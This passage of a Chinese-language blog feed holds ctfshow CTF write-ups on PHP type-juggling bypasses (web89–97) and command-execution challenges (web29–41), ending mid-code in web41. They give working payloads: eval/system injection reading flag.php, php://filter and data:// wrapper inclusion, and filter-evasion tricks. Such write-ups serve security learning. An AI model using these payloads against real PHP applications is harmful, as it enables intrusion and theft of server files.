repo: git@www.baoyf.com:/www/repo/hexo.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>这时候可能出现权限问题，导致部署到 git 失败。在服务器终端输入以下命令即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown -R git:git /var/repo/</span><br><span class="line">chown -R git:git /var/hexo/</span><br></pre></td></tr></table></figure><p>再次推送即可</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阿里云 </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow题解-PHP特性</title>
      <link href="/2023/08/21/CTFshow/CTFshow3/"/>
      <url>/2023/08/21/CTFshow/CTFshow3/</url>
      
        <content type="html"><![CDATA[<h1>PHP特性</h1><h2 id="常见特性及敏感函数总结">常见特性及敏感函数总结</h2><ol><li>==与===</li><li>md5 0e绕过、数组绕过</li><li>intval 进制或小数绕过</li><li>strpos 换行绕过</li><li>in_array 第三个参数是否设置，不设置为弱类型比较</li><li>preg_match 数组绕过，不带\m可用换行绕过</li><li>str_replace 无递归，双写绕过</li></ol><h2 id="web89">web89</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.w3cschool.cn/php/php-intval.html">intval</a>PHP中获取变量整数值的函数，遇到非空array返回1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1  # 使用数组绕过</span><br></pre></td></tr></table></figure><h2 id="web90">web90</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>intval函数用法可见以上链接，用十六进制绕过<br><code>?num=0x117c</code></p><h2 id="web91">web91</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123; <span class="comment"># /i表示不区分大小写</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123; <span class="comment"># /m 表示换行匹配</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见两判断条件的正则不同，第二个条件没有换行匹配，则可以用换行符绕过<br><code>?cmd=1%0aphp</code></p><h2 id="web92">web92</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>可用同90方法<br><strong>其他姿势</strong><br>intval()函数如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mtext>为</mtext><mn>0</mn><mtext>则</mtext></mrow><annotation encoding="application/x-tex">base为0则</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">为</span><span class="mord">0</span><span class="mord cjk_fallback">则</span></span></span></span>var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以</p><h2 id="web93">web93</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了字母，不能用十六进制，可以用八进制绕过<br><code>?num=010574</code></p><h2 id="web94">web94</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476<br><code>?num=4476.0</code></p><h2 id="web95">web95</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可通过换行绕过strpos函数<br><code>?num=%0a010574</code></p><h2 id="web96">web96</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强制匹配<code>flag.php</code>，用Linux当前路径绕过即可<br><code>?u=./flag.php</code></p><h2 id="web97">web97</h2><h3 id="题目描述">题目描述</h3><p><strong>开始php特性系列了，师傅们，冲冲冲！</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经典MD5,无脑数组过（注意POST）传参<br><code>a[]=1&amp;b[]=2</code></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow题解-命令执行</title>
      <link href="/2023/08/08/CTFshow/CTFshow2/"/>
      <url>/2023/08/08/CTFshow/CTFshow2/</url>
      
        <content type="html"><![CDATA[<h1>命令执行</h1><h2 id="29-web29">29.web29</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>严格来说属于eval代码执行<br>只过滤了/flag<br>可以做一些常规的尝试<br>/?c=phpinfo();   查看环境变量<br>/?c=system(‘ls’);  查看目录，发现flag.php<br>可以将php文件中内容拷贝到txt中<br>/?c=system(“cp fl*g.php 1.txt”);   <strong>用通配符<code>*</code>或者<code>?</code>绕过</strong><br>/?c=system(“cat fl?g.php”);<br>/1.txt  访问1.txt 得到flag</p><h2 id="30-web30">30.web30</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>比起上一题多过滤了system和php<br>我们换一种方法，在PHP中反引号包含的代码也是可执行的<br>构造payload ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=echo(`ls`);</span><br></pre></td></tr></table></figure><p>确定目标文件flag.php后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=`cp fla?.??? 1.txt`;</span><br></pre></td></tr></table></figure><p>最后访问/1.txt</p><h2 id="31-web31">31.web31</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>过滤的关键字明显多了起来<br>我们尝试eval嵌套的命令执行来实现参数逃逸</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?c=eval($_GET[1]);&amp;1=phpinfo();  </span><br><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;ls&#x27;);</span><br><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;cp flag.php 1.txt&#x27;);</span><br></pre></td></tr></table></figure><p>访问/1.txt<br>这里补充一下另外几种访问flag.php的方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;cp flag.php 1.txt&#x27;); </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拷贝到/1.txt</span></span><br><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;cat flag.php&#x27;); </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要查看源代码</span></span><br><span class="line">/?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;); </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">倒序输出</span></span><br></pre></td></tr></table></figure><h2 id="32-web32">32.web32</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>比上一题多过滤了<code>小括号</code>、<code>反引号</code>、<code>分号</code>、<code>空格</code>等<br>用文件包含函数<br>%0a url编码的换行符代替(<br>php语言最后一句话可省略分号，故用?&gt;绕过<br>再用php伪协议读取即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="33-web33">33.web33</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>比上一题多过滤了双引号，用上一题做法也可做<br>这次我们尝试用require</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>可以正常包含，解码得到flag</p><h2 id="34-web34">34.web34</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>多过滤了冒号，是为了过滤直接进行伪协议的参数<br>补充说明因为过滤了<code>小括号</code>、<code>分号</code>，只能使用php语言结构<code>print</code>、<code>echo</code>、<code>isset</code>、<code>unset</code>、<code>include</code>、<code>require</code>（不需要使用括号）<br>依然使用以上两种payload即可过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="35-web35">35.web35</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>相较上题多过滤了<code>&lt;</code>、<code>=</code><br>不过并不影响我们用以上方法绕过，不多赘述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="36-web36">36.web36</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>多过滤了数字，我们将变量名改为字母即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="37-web37">37.web37</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>考察<code>include</code>函数漏洞<br>利用data伪协议，将传入的字符串作为php代码执行<br><code>?c=data://text/plain,&lt;?php phpinfo()?&gt;</code> 经过测试可以正常执行<br>类似web29构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure><h2 id="38-39-web38-39">38、39.web38、39</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，需要严格的过滤</strong></p><h3 id="解题思路">解题思路</h3><p>此题多过滤了php、file<br>且在include后强制包含了后缀.php</p><?php可用<?=代替  `短标签绕过`> 注意理解代码执行和文件包含的关系我们继续使用data伪协议，代码执行优先<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(&quot;tac fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure>## 40.web40### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))</span><br></pre></td></tr></table></figure>看到以上过滤，可见字母、分号、下划线未被过滤解法较多一些网上看到的技巧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>还可通过cookie获得参数进行命令执行，经测试只能执行`ls`，无法拿到值更改cookie值passid=ls<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=session_start();system(session_id());</span><br></pre></td></tr></table></figure>最后一种巧妙的思路先尝试打印当前的所有变量<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(get_defined_vars());</span><br><span class="line">#Array ( [_GET] =&gt; Array ( [c] =&gt; print_r(get_defined_vars()); ) [_POST] =&gt; Array ( ) [_COOKIE] =&gt; Array ( [PHPSESSID] =&gt; tkhs3pjqvj2f4ag9hreibpfkpg ) [_FILES] =&gt; Array ( ) [c] =&gt; print_r(get_defined_vars()); )</span><br><span class="line"># 可以看到_GET和_POST等类型变量储存在数组中</span><br></pre></td></tr></table></figure>我们可以以POST形式传参`a=phpinfo()`，发现数组也有变化` [_POST] => Array ( [a] => phpinfo() )`此时思路是拿到数组中的字符串，我们就可以进行RCE（远程代码执行）我们用next操作拿到存放_POST变量的数组`?c=print_r(next(get_defined_vars()));`利用数组弹出操作拿到数组中值`?c=print_r(array_pop(next(get_defined_vars())));`接下来执行代码即可`?c=eval(array_pop(next(get_defined_vars())));`改变传参拿到flag`a=system("tac flag.php");`## 41.web41### 题目描述**过滤不严，命令执行**### 解题思路[思路参考](https://blog.csdn.net/miuzzx/article/details/108569080)这个题过滤了`$、+、-、^、~`使得**异或自增和取反**构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符`|`<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;, $c))</span><br></pre></td></tr></table></figure>因为过滤了大部分可见字符，通过不可见字符做或运算构造字母的脚本<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 